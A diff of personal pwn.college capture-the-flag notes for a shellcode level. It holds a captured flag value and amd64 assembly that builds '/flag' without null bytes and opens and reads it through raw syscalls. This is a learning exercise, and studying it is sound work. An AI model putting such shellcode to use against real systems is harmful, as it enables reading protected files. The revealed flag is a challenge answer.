@@ -235,15 +235,13 @@ flag=pwn.college{gDBurPf4kUtqmbvJjYddeAa2cDA.QX4EjMsADOzQzW}
                
 https://null-byte.wonderhowto.com/how-to/writing-64-bit-shellcode-part-2-removing-null-bytes-0161591/
 https://github.com/shoulderhu/pwn-college/wiki/babyshell-level4
+//just modify your level 1 code by first replacing the 0s with 1s and shifting out
 
 asm -c amd64 "movabs  rbx, 0x11111167616c662f
     shl     rbx, 0x18
     shr     rbx, 0x18
     push    rbx
     
-    mov     rdx, 0x1111111111111104
-    shl     rdx, 0x38
-    shr     rdx, 0x30
     xor     rsi, rsi
     mov     rdi, rsp
     mov     rax, 0x1111111111111102
@@ -264,7 +262,6 @@ asm -c amd64 "movabs  rbx, 0x11111167616c662f
     shr     rax, 0x38
     syscall
     
-    xor     rdi, rdi
     mov     rax, 0x111111111111113c
     shl     rax, 0x38
     shr     rax, 0x38
